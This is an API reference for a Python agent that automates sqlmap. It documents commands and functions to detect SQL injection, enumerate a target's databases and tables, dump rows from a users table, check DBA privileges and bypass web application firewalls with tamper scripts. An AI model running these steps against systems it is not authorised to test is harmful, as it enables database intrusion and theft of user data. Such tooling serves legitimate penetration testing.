# API Reference: sqlmap Automation Agent

## Dependencies

| Library | Version | Purpose |
|---------|---------|---------|
| sqlmap | >=1.7 | SQL injection detection and exploitation (subprocess) |

## CLI Usage

```bash
# Detection scan
python scripts/agent.py --url "https://target.com/page?id=1" --param id --action detect

# Enumerate databases
python scripts/agent.py --url "https://target.com/page?id=1" --action dbs

# List tables
python scripts/agent.py --url "https://target.com/page?id=1" --action tables --database target_db

# Dump table rows
python scripts/agent.py --url "https://target.com/page?id=1" --action dump \
  --database target_db --table users

# Check privileges
python scripts/agent.py --url "https://target.com/page?id=1" --action privs
```

## Functions

### `find_sqlmap() -> str`
Searches common paths for the sqlmap binary.

### `run_detection_scan(sqlmap_bin, url, param, request_file, cookie, tamper) -> dict`
Runs `sqlmap --batch --random-agent` and parses output for injectability, DB type, and techniques.

### `enumerate_databases(sqlmap_bin, url, param, cookie) -> list`
Runs `sqlmap --dbs` and extracts database names from output.

### `enumerate_tables(sqlmap_bin, url, database, param, cookie) -> list`
Runs `sqlmap -D db --tables` and parses table names.

### `dump_table(sqlmap_bin, url, database, table, columns, limit, param, cookie) -> dict`
Runs `sqlmap -D db -T tbl --dump --start=1 --stop=N`.

### `check_privileges(sqlmap_bin, url, param, cookie) -> dict`
Runs `--current-user --current-db --is-dba` to assess DB privileges.

## sqlmap Flags Used

| Flag | Purpose |
|------|---------|
| `--batch` | Non-interactive mode |
| `--random-agent` | Randomize User-Agent header |
| `-p` | Specify injectable parameter |
| `--tamper` | Apply WAF bypass tamper scripts |
| `--dbs` | Enumerate databases |
| `--tables` | Enumerate tables |
| `--dump` | Extract table data |
| `--is-dba` | Check DBA privileges |

## Output Schema

```json
{
  "action": "detect",
  "url": "https://target.com/page?id=1",
  "result": {
    "injectable": true,
    "database": "MySQL",
    "techniques": ["boolean-based", "UNION query"]
  }
}
```
